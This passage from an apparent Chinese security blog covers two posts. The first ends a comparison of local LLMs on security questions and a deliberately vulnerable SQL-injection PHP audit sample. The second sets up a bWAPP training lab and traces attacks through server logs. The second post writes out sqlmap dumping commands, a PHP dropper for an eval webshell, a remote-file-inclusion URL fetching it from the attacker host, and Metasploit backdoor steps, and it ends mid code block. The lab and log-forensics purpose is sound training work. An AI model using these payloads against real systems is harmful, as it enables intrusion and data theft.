title="测试性能"></a>测试性能</h2><p>在本文章中，会对部署在本地的模型进行相同的提问测试，包括知识广度和代码能力</p><h3 id="知识广度"><a href="#知识广度" class="headerlink" title="知识广度"></a>知识广度</h3><p>首先是知识广度上的测试，我们询问2道安全岗的面试题</p><h4 id="问题1"><a href="#问题1" class="headerlink" title="问题1"></a>问题1</h4><blockquote><ol><li>请向我介绍一下蜜罐技术</li></ol></blockquote><img src="/posts/c9a7f16894ae/image-20240407165034608.png" class="" title="image-20240407165034608"><p><strong>Mistral</strong>从原理和应用上全方位介绍了蜜罐技术，它的回答不仅准确，用词也非常专业。</p><img src="/posts/c9a7f16894ae/image-20240407170216683.png" class="" title="image-20240407170216683"><p><strong>Qwen</strong>的回答非常模板化，使用总分总的形式展开回答，但相比Mistral的回答少一些实用细节</p><img src="/posts/c9a7f16894ae/image-20240407165126821.png" class="" title="image-20240407165126821"><p><strong>Gemma</strong>的回答虽然详细但完全不适用，因为它误解了蜜罐技术的定义，说明它在知识广度上和其他模型存在差距</p><img src="/posts/c9a7f16894ae/image-20240407165143192.png" class="" title="image-20240407165143192"><p><strong>Codellama</strong>的回答提供了一个与网络安全不同的视角，专注于使用蜜罐收集用户行为数据的概念。虽然这种用法在市场研究和用户行为分析中可能有其价值，但它与蜜罐技术在网络安全领域的典型应用相去甚远。</p><h4 id="问题2"><a href="#问题2" class="headerlink" title="问题2"></a>问题2</h4><blockquote><ol><li>信息收集如何处理子域名爆破的泛解析问题?</li></ol></blockquote><p>MIstral回答如下</p><blockquote><p> During information gathering or subdomain enumeration, an attacker may use techniques like DNS brute-forcing or subdomain enumeration tools to discover potential subdomains of a target domain. One common issue they might encounter is the presence of Zone Transfer (MX) records or CNAME records pointing to IP addresses with open resolver servers or to other domains, which can facilitate the discovery of additional subdomains through a process called transitive name resolution, also known as “glue” or “tied” records.</p><p>To mitigate this issue, organizations can take several steps when handling subdomain enumeration:</p><ol><li>Disable Open Resolver Servers: Ensure that your DNS servers are not configured to respond to unsolicited recursive queries from external sources. This will prevent attackers from using them as a means to discover additional subdomains through transitive name resolution.</li><li>Configure Response Rate Limiting (RRL): Implement RRL on your DNS servers to limit the number of requests that can be sent by a single source in a given time frame. This will help prevent attackers from quickly enumerating multiple subdomains using brute-forcing tools.</li><li>Filter Out Undesired Records: Use firewalls and access control lists (ACLs) to block or filter out unnecessary DNS records, such as MX records that contain open resolver servers or CNAME records pointing to external domains.</li><li>Monitor for Anomalous Activity: Set up intrusion detection systems (IDS) and security information and event management (SIEM) solutions to monitor and alert on anomalous DNS queries, such as rapid subdomain enumeration attempts.</li><li>Implement Honeypots and Decoys: Use Honeypot technologies and decoy domains to misdirect attackers from the real infrastructure. This can help protect sensitive information and resources while also providing valuable intelligence about the attacker’s tactics, techniques, and procedures (TTPs).</li><li>Regularly Update DNS Records: Ensure that your subdomain records are updated regularly to minimize the exposure of old or outdated services or applications. This will help reduce the likelihood of discovery through enumeration attempts.</li><li>Implement DNS Security Extensions: Use DNS security extensions such as DNSSEC and DANE to secure your DNS infrastructure and prevent attackers from manipulating or poisoning your records.</li></ol></blockquote><img src="/posts/c9a7f16894ae/image-20240407171424967.png" class="" title="image-20240407171424967"><p>Gemma回答如下</p><blockquote><p>信息收集如何处理子域名爆破的泛解析问题取决于具体情况，以下是一些常见解决方案：</p><p><strong>1. 分析泛解析结果</strong></p><ul><li>首先，需要确认子域名是否真正属于您。您可以通过域名注册页面或 DNS 管控器的 DNS 查询来查询子域名是否指向您指定的服务器。</li><li>您可以分析泛解析结果的来源，例如，如果子域名来自根域名注册服务器，那么它可能被恶意攻击者通过 DNS poisoning攻击。</li><li>您可以分析泛解析结果的记录，例如，如果记录中存在一个指向恶意网站的记录，则可能是一个恶意攻击者的攻击目标。</li></ul><p><strong>2. 识别恶意记录</strong></p><ul><li>恶意记录通常包含以下特征：<ul><li>与您网络相关的名称，例如子域名或 IP 地址。</li><li>与您的网站或服务相关的名称。</li><li>与其他恶意记录相同的语法或内容。</li><li>与您服务器连接的端口或协议。</li><li>与您网站上部署的软件或工具相关的名称。</li></ul></li><li>您可以使用工具，例如 iRule 或 Nessus，来分析网络记录并识别恶意记录。</li></ul><p><strong>3. 阻止恶意记录</strong></p><ul><li>您可以使用 DNS 过滤器或其他安全工具来阻止恶意记录的创建或更新。</li><li>您可以使用 DNS 记录过滤技术来阻止特定子域名或 IP 地址访问特定网站或服务。</li><li>您可以使用反恶意软件扫描工具来扫描您的网络，以识别并删除恶意软件。</li></ul><p><strong>4. 监控子域名的变化</strong></p><ul><li>定期检查子域名的 DNS 记录，以确保它们仍然指向您的服务器。</li><li>如果您发现子域名已改变指向恶意网站，请立即采取行动。</li></ul><p><strong>5. 考虑实施安全措施</strong></p><ul><li>使用 SSL 证书来加密您的网站连接。</li><li>使用防火墙和入侵检测系统 (IDS) 来保护您的网络。</li><li>使用安全软件，例如恶意软件扫描工具和 DNS 过滤工具，来保护您的设备和数据。</li><li>确保您的设备和软件的更新及时完成。</li></ul><p>请注意，处理子域名爆破的泛解析问题需要专业技能和经验，建议您寻求安全专家或安全团队的帮助。</p></blockquote><img src="/posts/c9a7f16894ae/image-20240407171542612.png" class="" title="image-20240407171542612"><p>在这个问题上，<strong>Codellama</strong>的回答显然优于其他三种模型，因为他理解了<strong>信息收集</strong>的含义，所以提出了攻击建议而不是防御建议</p><h3 id="代码能力"><a href="#代码能力" class="headerlink" title="代码能力"></a>代码能力</h3><p>在代码能力上，我们让模型进行代码审计，来测试它们对代码的理解能力</p><p>问题如下</p><blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 获取用户提交的用户名</span></span><br><span class="line"><span class="variable">$username</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// 连接到数据库</span></span><br><span class="line"><span class="variable">$conn</span> = <span class="keyword">new</span> <span class="title function_ invoke__">mysqli</span>(<span class="string">&#x27;localhost&#x27;</span>, <span class="string">&#x27;user&#x27;</span>, <span class="string">&#x27;password&#x27;</span>, <span class="string">&#x27;database&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 检查连接</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$conn</span>-&gt;connect_error) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;连接失败: &quot;</span> . <span class="variable">$conn</span>-&gt;connect_error);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 构造SQL查询，这里存在SQL注入的风险</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM users WHERE username = &#x27;<span class="subst">$username</span>&#x27;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$result</span> = <span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$result</span>-&gt;num_rows &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="comment">// 输出每一行数据</span></span><br><span class="line">    <span class="keyword">while</span>(<span class="variable">$row</span> = <span class="variable">$result</span>-&gt;<span class="title function_ invoke__">fetch_assoc</span>()) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;id: &quot;</span> . <span class="variable">$row</span>[<span class="string">&quot;id&quot;</span>]. <span class="string">&quot; - Name: &quot;</span> . <span class="variable">$row</span>[<span class="string">&quot;name&quot;</span>]. <span class="string">&quot; - Email: &quot;</span> . <span class="variable">$row</span>[<span class="string">&quot;email&quot;</span>]. <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;0 结果&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>请识别上述PHP代码中存在的安全漏洞，并解释为什么这些部分是脆弱的。如果有的话，请提出对上述代码进行优化的建议，以提高其效率和安全性。</p></blockquote><p>这段代码存在SQL注入漏洞</p><p>Mistral回答如下</p><blockquote><p> The given PHP code has several security vulnerabilities:</p><ol><li>SQL Injection: The code uses user-supplied input ($username) directly in the SQL query without any form of validation or sanitization. This makes it vulnerable to SQL injection attacks where an attacker can inject malicious SQL statements and potentially gain unauthorized access to sensitive data, modify or delete data, or even take control of the database server. To mitigate this risk, it’s recommended to use prepared statements with parameterized queries instead of directly inserting user input into the query string. This will help ensure that any user input is treated as literal values rather than SQL code.</li><li>Lack of Input Validation: The code does not check if the user-supplied ‘username’ parameter is valid or within expected format. This can lead to unexpected behavior and potential security issues. It’s important to validate user input, for example by checking its length, character set, or using regular expressions.</li><li>Lack of Error Handling: The code does not have proper error handling mechanisms in place. If the query fails due to an SQL syntax error, the code will simply display a generic error message “连接失败:”. It’s important to handle errors gracefully and provide informative error messages to the user.</li><li>Insecure Database Credentials: The database credentials are hardcoded in the script which is not recommended as it can expose sensitive information if the source code gets compromised. Instead, use environment variables or configuration files that are not accessible to the public.</li><li>Use of mysqli_ instead of PDO: While both are PHP extensions for interacting with databases, MySQLi is considered less secure than PDO since it does not support prepared statements by default and lacks some advanced features like statement binding. It’s generally recommended to use PDO over MySQLi for better security and ease-of-use.</li></ol><p>To improve the code, consider the following suggestions:</p><ol><li>Use Prepared Statements with Parameterized Queries: Replace the current SQL query construction method with prepared statements and parameterized queries which will help prevent SQL injection attacks by ensuring that user input is treated as literal values.</li><li>Input Validation: Validate user input before processing it to ensure that it meets expected format and length requirements. Use regular expressions or other validation functions to check the input.</li><li>Proper Error Handling: Implement error handling to provide informative error messages to the user in case of any SQL query failures. This will help prevent potential attacks by providing minimal information to attackers.</li><li>Keep Database Credentials Secure: Do not hardcode database credentials in the script. Instead, use environment variables or configuration files that are not accessible to the public.</li><li>Use PDO instead of MySQLi: Consider using PHP Data Objects (PDO) extension for better security and ease-of-use since it supports prepared statements by default and has advanced features like statement binding which can help prevent SQL injection attacks.</li></ol></blockquote><p>Mistral准确地识别了SQL注入漏洞，并提供了标准的解决方案，即使用预处理语句和参数化查询。同时Mistral正确指出了缺乏输入验证和错误处理的问题。</p><img src="/posts/c9a7f16894ae/image-20240407174713764.png" class="" title="image-20240407174713764"><p>Qwen的回答依然非常简短，虽然它正确识别出了SQL注入的漏洞并给出了优化建议，但它提到了未正确关闭数据库，很明显是对代码的误解</p><img src="/posts/c9a7f16894ae/image-20240407175252014.png" class="" title="image-20240407175252014"><p>Gemma识别出了SQL注入漏洞，并提出了一系列防御措施。然而，一些建议表述可能不够精确，特别是关于用户输入处理的部分。</p><p>Codellama的回答中，对代码的优化建议最为全面</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><div class="table-container"><table><thead><tr><th style="text-align:center">模型</th><th style="text-align:center">知识广度</th><th style="text-align:center">代码理解能力</th></tr></thead><tbody><tr><td style="text-align:center">Mistral</td><td style="text-align:center">高</td><td style="text-align:center">高</td></tr><tr><td style="text-align:center">Qwen</td><td style="text-align:center">中</td><td style="text-align:center">中</td></tr><tr><td style="text-align:center">Gemma</td><td style="text-align:center">中</td><td style="text-align:center">中</td></tr><tr><td style="text-align:center">Codellama</td><td style="text-align:center">高</td><td style="text-align:center">高</td></tr></tbody></table></div><p>经过简单的测试，Mistral和Codellama的表现相对来说更加出色，能够部分满足我们对本地大模型的需求</p>]]></content>
      
      
      
        <tags>
            
            <tag> LLM </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>bWAPP靶场搭建及网站日志溯源实验</title>
      <link href="/posts/03abd66ba21a/"/>
      <url>/posts/03abd66ba21a/</url>
      
        <content type="html"><![CDATA[<h2 id="bWAPP靶场搭建"><a href="#bWAPP靶场搭建" class="headerlink" title="bWAPP靶场搭建"></a>bWAPP靶场搭建</h2><h3 id="bWAPP靶场简介"><a href="#bWAPP靶场简介" class="headerlink" title="bWAPP靶场简介"></a>bWAPP靶场简介</h3><div class="note info flat"><p><strong>bWAPP</strong>，或称为“buggy Web Application”，是一个开源的、故意设计有漏洞的Web应用程序。它用于教育和训练安全性测试的目的，提供了一个安全的环境来实践和提高Web应用程序渗透测试的技能。bWAPP涵盖了各种Web应用程序安全漏洞，包括所有的OWASP Top 10漏洞，以及其他许多常见的安全问题，如SQL注入、XSS（跨站脚本攻击）、CSRF（跨站请求伪造）、XML注入等。</p></div><h3 id="安装phpstudy"><a href="#安装phpstudy" class="headerlink" title="安装phpstudy"></a>安装phpstudy</h3><p>phpstudy没什么好说的，基本上学习WEB都需要用到</p><p>这里就放一个下载链接：<a href="https://www.xp.cn/">https://www.xp.cn/</a></p><h3 id="下载bWAPP靶场"><a href="#下载bWAPP靶场" class="headerlink" title="下载bWAPP靶场"></a>下载bWAPP靶场</h3><p>bWAPP下载地址：<a href="https://sourceforge.net/projects/bwapp/">https://sourceforge.net/projects/bwapp/</a></p><img src="/posts/03abd66ba21a/image-20240329153609570.png" class="" title="image-20240329153609570"><p>需要注意的是，SourceForge网站会提示该文件包含病毒，需要我们额外手动点击<u>DOWNLOAD</u>链接</p><h3 id="设置数据库"><a href="#设置数据库" class="headerlink" title="设置数据库"></a>设置数据库</h3><p>将bWAPP靶场的源码<code>bWAPP</code>文件夹放在phpstudy的WWW目录下</p><img src="/posts/03abd66ba21a/image-20240329162754293.png" class="" title="image-20240329162754293"><p>在<code>bWAPP/admin</code>目录下找到<code>settings.php</code>配置文件</p><img src="/posts/03abd66ba21a/image-20240329163856747.png" class="" title="image-20240329163856747"><p>打开后修改其中的数据库用户名和密码</p><img src="/posts/03abd66ba21a/image-20240329164132925.png" class="" title="image-20240329164132925"><p>在首页中启动MySQL和Apache服务</p><img src="/posts/03abd66ba21a/image-20240329164346939.png" class="" title="image-20240329164346939"><p>进入网站栏，点击创建网站</p><p>域名使用本地地址localhost即可</p><p>根目录设置为bWAPP文件夹的路径</p><p>最后点击<strong>创建数据库</strong></p><img src="/posts/03abd66ba21a/image-20240329165350207.png" class="" title="image-20240329165350207"><p>这里数据库的名称、用户名和密码与刚刚配置文件中的内容同步</p><img src="/posts/03abd66ba21a/image-20240329164918328.png" class="" title="image-20240329164918328"><p>打开浏览器，访问<code>http://localhost/login.php</code>进入靶场首页，访问成功</p><img src="/posts/03abd66ba21a/image-20240329170134999.png" class="" title="image-20240329170134999"><p>bWAPP默认使用的是sqlite数据库，所以需要将其中的数据导入到搭建的MySQL数据库中</p><p>打开Navicat软件，首先连接上phpstudy的MySQL数据库</p><img src="/posts/03abd66ba21a/image-20240329171001479.png" class="" title="image-20240329171001479"><p>其中有刚刚创建的bwapp库，不过里面没有任何表</p><img src="/posts/03abd66ba21a/image-20240329171124930.png" class="" title="image-20240329171124930"><p>接下来找到bwapp自带的数据库，位于<code>bWAPP/db</code>目录下</p><img src="/posts/03abd66ba21a/image-20240329171536638.png" class="" title="image-20240329171536638"><p>将Sqlite的main库中的数据表依次复制到MySQL中</p><img src="/posts/03abd66ba21a/image-20240329171752665.png" class="" title="image-20240329171752665"><img src="/posts/03abd66ba21a/image-20240329171834611.png" class="" title="image-20240329171834611"><p>进入自动传输界面，将每个表都勾上</p><img src="/posts/03abd66ba21a/image-20240329171950632.png" class="" title="image-20240329171950632"><h3 id="切换PHP版本（重要）"><a href="#切换PHP版本（重要）" class="headerlink" title="切换PHP版本（重要）"></a>切换PHP版本（重要）</h3><p>由于bwapp这个靶场年代久远，很多关卡需要旧版本PHP才能部署，所以需要在网站设置中切换PHP版本，这里设置为PHP5.5.9（PHP7以前的版本基本都可以）</p><img src="/posts/03abd66ba21a/image-20240401153118591.png" class="" title="image-20240401153118591"><h3 id="登录靶场"><a href="#登录靶场" class="headerlink" title="登录靶场"></a>登录靶场</h3><p>访问<code>http://localhost/login.php</code>，回到登录页面，输入默认用户名<code>bee</code>和密码<code>bug</code></p><img src="/posts/03abd66ba21a/image-20240329174236669.png" class="" title="image-20240329174236669"><p>成功进入靶场</p><h2 id="定位日志位置"><a href="#定位日志位置" class="headerlink" title="定位日志位置"></a>定位日志位置</h2><p>在phpstudy搭建的靶场环境中，需要主要关注Apache和MySQL的日志文件，因为这些日志能够记录下网站访问信息、错误信息以及数据库操作信息，是分析攻击行为和手段的关键数据。</p><h3 id="Apache日志文件"><a href="#Apache日志文件" class="headerlink" title="Apache日志文件"></a>Apache日志文件</h3><p>对于Apache服务器，日志文件主要分为访问日志和错误日志。在phpstudy环境下，这些日志文件通常位于：</p><ul><li><strong>访问日志</strong>：<code>[phpStudy安装路径]\Apache\logs\access.log</code></li><li><strong>错误日志</strong>：<code>[phpStudy安装路径]\Apache\logs\error.log</code></li></ul><p>访问日志记录了所有对网站的请求，包括请求的URL、请求时间、客户端IP等信息。通过分析访问日志，可以追踪攻击者的访问路径和尝试的攻击类型。错误日志则记录了网站运行过程中的错误信息，对于分析攻击是否成功以及确定攻击导致的具体错误非常有用。</p><h3 id="开启请求体记录"><a href="#开启请求体记录" class="headerlink" title="开启请求体记录"></a>开启请求体记录</h3><p>mod_dumpio模块会记录所有Apache接收到的请求数据和输出的响应数据</p><p>找到Apache的配置文件，默认路径通常为<code>apache\conf\httpd.conf</code></p><p>用记事本打开并定位到下面这行设置，取消它的注释</p><img src="/posts/03abd66ba21a/image-20240402102938144.png" class="" title="image-20240402102938144"><p>在最后一行添加<code>DumpIOInput On</code>，仅开启对请求数据的完整记录</p><p>同时，为了输出到日志文件中，需要确保LogLevel改为trace7</p><img src="/posts/03abd66ba21a/image-20240402104156082.png" class="" title="image-20240402104156082"><p>重启Apache服务器</p><h3 id="MySQL日志文件"><a href="#MySQL日志文件" class="headerlink" title="MySQL日志文件"></a>MySQL日志文件</h3><p>MySQL的日志可以帮助我们跟踪数据库查询操作，对于分析SQL注入攻击尤为重要。在phpstudy环境下，MySQL的错误日志通常位于：</p><ul><li><code>[phpStudy安装路径]\MySQL\data\[服务器名称].err</code></li></ul><h3 id="开启通用查询日志"><a href="#开启通用查询日志" class="headerlink" title="开启通用查询日志"></a>开启通用查询日志</h3><p>除了基本的错误日志，MySQL还可以开启<strong>通用查询日志</strong></p><p>通用查询日志记录了数据库接收到的每一个指令，包括SQL语句</p><p>找到MySQL的配置文件，通常是<code>my.cnf</code>或<code>my.ini</code>，位置根据操作系统和MySQL版本而异</p><p>在<code>[mysqld]</code>节中添加如下语句</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[mysqld]</span></span><br><span class="line"><span class="attr">general_log</span> = <span class="number">1</span></span><br><span class="line"><span class="attr">general_log_file</span> = /path/to/your/logfile.log</span><br></pre></td></tr></table></figure><p>日志的位置<code>general_log_file</code>视方便来设置，可以直接设在MySQL根目录下，即<code>[phpStudy安装路径]\MySQL</code></p><p>重启MySQL服务，进入<code>MySQL/bin</code>目录下打开终端，连接到靶场的mysql数据库</p><img src="/posts/03abd66ba21a/image-20240401133743306.png" class="" title="image-20240401133743306"><p>回到根目录，使用记事本打开日志文件，可以看到刚刚的登录信息被记录下来</p><img src="/posts/03abd66ba21a/image-20240401133843499.png" class="" title="image-20240401133843499"><p>我们再测试一条SQL语句<code>Show databases;</code></p><img src="/posts/03abd66ba21a/image-20240401133950649.png" class="" title="image-20240401133950649"><p>回到日志文件，刚刚的SQL查询语句已经被记录下来</p><img src="/posts/03abd66ba21a/image-20240401134024247.png" class="" title="image-20240401134024247"><h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h2><h3 id="实施攻击"><a href="#实施攻击" class="headerlink" title="实施攻击"></a>实施攻击</h3><p>SQL注入的关卡选择<strong>布尔盲注</strong>这关，即SQL Injection - Blind - Boolean-Based，因为布尔盲注的注入过程和SQL语句具有明显的步骤特征，适合进行日志分析溯源</p><p>首先收集关卡的信息，关卡页面中只有数据库查询功能</p><img src="/posts/03abd66ba21a/image-20240401154103098.png" class="" title="image-20240401154103098"><p>使用<code>R1ck&#39; or 1=1 --</code>判断注入点</p><img src="/posts/03abd66ba21a/image-20240401155158815.png" class="" title="image-20240401155158815"><p>并没有返回具体数据，而是返回一个布尔值，非常符合布尔盲注的条件</p><p>因为后续对该攻击过程的日志分析更加重要，这里就不进行手动注入了</p><p>直接使用自动工具sqlmap进行布尔盲注，执行如下指令(由于使用的是kali虚拟机上的sqlmap，localhost替换成主机的内网IP)</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;172.29.82.96/sqli_4.php?title=t&amp;action=search&quot; --cookie &quot;security_level=0; PHPSESSID=844c9m2j6bd5r8mmhqftrnaip7&quot; --dbs --technique=B --risk=2 --level=2</span><br></pre></td></tr></table></figure><p>使用<code>technique</code>选项来指定攻击类型为布尔盲注</p><p>由于该靶场需要登录，在浏览器中找到该靶场的cookie，放在cookie选项后</p><img src="/posts/03abd66ba21a/image-20240401164535664.png" class="" title="image-20240401164535664"><p>需要注意的是，该页面除了title这个注入点，还需要设置action参数为search后才能搜索</p><img src="/posts/03abd66ba21a/image-20240401164700122.png" class="" title="image-20240401164700122"><p>得到数据库后，开始爆破bwapp库中的数据表，执行如下指令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;172.29.82.96/sqli_4.php?title=t&amp;action=search&quot; --cookie &quot;security_level=0; PHPSESSID=844c9m2j6bd5r8mmhqftrnaip7&quot; -D bwapp --tables --technique=B --risk=2 --level=2</span><br></pre></td></tr></table></figure><img src="/posts/03abd66ba21a/image-20240401164855391.png" class="" title="image-20240401164855391"><p>选择本关使用的movies数据表，爆破出其中的数据（包括爆破字段名和具体数据项）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;172.29.82.96/sqli_4.php?title=t&amp;action=search&quot; --cookie &quot;security_level=0; PHPSESSID=844c9m2j6bd5r8mmhqftrnaip7&quot; -T movies --dump --technique=B --risk=2 --level=2</span><br></pre></td></tr></table></figure><p>得到movies数据表下的所有数据项，这里可以看作本关卡攻击成功</p><img src="/posts/03abd66ba21a/image-20240401165517085.png" class="" title="image-20240401165517085"><h3 id="日志分析"><a href="#日志分析" class="headerlink" title="日志分析"></a>日志分析</h3><p>实施完攻击后，查看生成的数据库日志</p><p>攻击者（这里是sqlmap）的SQL语句存在很强的布尔盲注特征</p><p>首先sqlmap向数据库注入一些常规的语句，用来确定数据库的类型或版本，同时探测数据库的特定特性或漏洞。</p><p>例如<code>AND 2892=(SELECT (CASE WHEN ((SELECT TDESENCRYPT(NULL,NULL)) IS NULL) THEN 2892 ELSE (SELECT 2745 UNION SELECT 9850) END))</code>这一句</p><img src="/posts/03abd66ba21a/image-20240401173903229.png" class="" title="image-20240401173903229"><p>该SQL语句尝试调用<code>TDESENCRYPT</code>函数，这是一个数据库特定的加密/解密函数，通过这种方式，攻击者试图确定数据库是否支持此函数，从而推测数据库类型。</p><p>像Sybase ASE和 Microsoft SQL Server数据库都使用TDE来加密存储在数据库中的数据</p><p>而下图中的的这些语句则通过爆破<code>VERSION()</code>等函数来确定数据库的版本</p><img src="/posts/03abd66ba21a/image-20240401174145029.png" class="" title="image-20240401174145029"><p>在确认数据库类型之后，sqlmap开始针对性地进行布尔盲注攻击</p><p>靶场的数据库为MySQL，所以sqlmap利用MySQL支持的INFORMATION_SCHEMA数据库来爆破出靶场数据库中存在的库</p><p>当然，在爆破每个字符串时，sqlmap也存在一些特征，可以从日志中分析出来</p><img src="/posts/03abd66ba21a/image-20240401180135234.png" class="" title="image-20240401180135234"><p>sqlmap使用了<strong>二分法</strong>来确认每个字符的chr值，这样相比于常规的一个值一个值进行比对要快得多</p><p>整个脱库的过程遵循着爆破数据库、爆破数据表、爆破字段名、爆破具体数据项的步骤</p><img src="/posts/03abd66ba21a/image-20240401180732848.png" class="" title="image-20240401180732848"><h2 id="远程文件包含"><a href="#远程文件包含" class="headerlink" title="远程文件包含"></a>远程文件包含</h2><h3 id="打开远程文件包含配置"><a href="#打开远程文件包含配置" class="headerlink" title="打开远程文件包含配置"></a>打开远程文件包含配置</h3><p>进入phpstudy的设置&gt;配置文件栏，点击使用的php版本</p><img src="/posts/03abd66ba21a/image-20240402010057937.png" class="" title="image-20240402010057937"><p>找到<code>allow_url_include</code>这项配置，将Off改为On</p><img src="/posts/03abd66ba21a/image-20240402010217336.png" class="" title="image-20240402010217336"><p><strong>重启Apache服务器</strong></p><h3 id="实施攻击-1"><a href="#实施攻击-1" class="headerlink" title="实施攻击"></a>实施攻击</h3><p>本关卡使用kali虚拟机来模拟攻击机，将一句话木马写到<code>hack.jpg</code>文件中</p><p>文件内容如下，注意内层的key用了单引号，外层代码需要用双引号包裹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$code</span> = <span class="string">&quot;&lt;?php eval(<span class="subst">$_POST</span>[\&#x27;R1ck\&#x27;]); ?&gt;&quot;</span>;</span><br><span class="line">    <span class="title function_ invoke__">fputs</span>(<span class="title function_ invoke__">fopen</span>(<span class="string">&quot;shell2024.php&quot;</span>, <span class="string">&quot;w&quot;</span>), <span class="variable">$code</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>接下来检查kali虚拟机中是否安装了Apache服务器，执行<code>apache2 -v</code></p><img src="/posts/03abd66ba21a/image-20240402004720441.png" class="" title="image-20240402004720441"><p>成功返回版本信息，说明kali中已经安装Apache服务器</p><p>Apache的默认Web根目录通常位于<code>/var/www/html</code>，将刚刚构造的木马文件放于该目录下</p><img src="/posts/03abd66ba21a/image-20240402005252525.png" class="" title="image-20240402005252525"><p>执行<code>sudo systemctl start apache2</code>来启动Apache服务器</p><p>此时在主机上测试是否能访问到kali虚拟机构建的服务器下的文件</p><p>在浏览器中访问<code>172.29.74.233/hack.jpg</code>，发现浏览器以图片形式加载了该木马文件，说明远程服务器可以连接</p><img src="/posts/03abd66ba21a/image-20240402005359834.png" class="" title="image-20240402005359834"><p>在kali攻击机的浏览器中输入<code>http://172.29.82.96/rlfi.php?language=http://172.29.74.233/hack.jpg&amp;action=go</code>来利用远程文件包含漏洞</p><img src="/posts/03abd66ba21a/image-20240402112113628.webp" class="" title="image-20240402112113628"><p>使用kali中的<code>Metasploit</code>来连接到包含的远程文件中的一句话木马</p><p>执行<code>msfconsole</code>进入控制台</p><p>执行<code>use exploit/multi/http/caidao_php_backdoor_exec</code>，使用其中自带的中国菜刀工具</p><p>PASSWORD即注入点，设置为<code>R1ck</code></p><p>URI设置为生成的webshell后门<code>/shell2024.php</code></p><p>设置RHOST为靶机IP</p><img src="/posts/03abd66ba21a/image-20240402110513359.png" class="" title="image-20240402110513359"><p>执行exploit</p><img src="/posts/03abd66ba21a/image-20240402110802055.png" class="" title="image-20240402110802055"><p>执行几个远程指令测试一下，例如<code>ls ..</code>，成功输出上层目录下的文件</p><img src="/posts/03abd66ba21a/image-20240402110907922.png" class="" title="image-20240402110907922"><p>执行<code>sysinfo</code>输出靶机的系统信息</p><img src="/posts/03abd66ba21a/image-20240402111733099.png" class="" title="image-20240402111733099"><h3 id="日志分析-1"><a href="#日志分析-1" class="headerlink" title="日志分析"></a>日志分析</h3><p>在访问日志access.log中，能够找到一开始利用远程文件包含的请求</p><img src="/posts/03abd66ba21a/image-20240402112246280.png" class="" title="image-20240402112246280"><p>接下来攻击者连接后门并远程执行指令的过程都记录在error.log中</p><p>观察dumpio模块记录在error.log中的日志，整个攻击过程都是通过http请求完成的</p><img src="/posts/03abd66ba21a/image-20240402112739440.png" class="" title="image-20240402112739440"><p>meterpreter工具将自身伪装为IPAD设备，同时发送的远程命令使用了base64编码来加密</p><img src="/posts/03abd66ba21a/image-20240402112856009.png" class="" title="image-20240402112856009"><p>选择一句加密后的命令，丢到cyberchef中，先解一层url编码，然后是base64编码</p><img src="/posts/03abd66ba21a/image-20240402132218052.png" class="" title="image-20240402132218052"><p>这段传输的PHP代码是一个典型的远程代码执行（RCE）载荷</p><p><code>error_reporting(0);</code>用于禁用错误报告，使得在执行过程中不显示任何错误信息，增加了代码的隐蔽性。</p><p>后面这段PHP代码的允许它接收并执行来自攻击者的任何PHP代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span 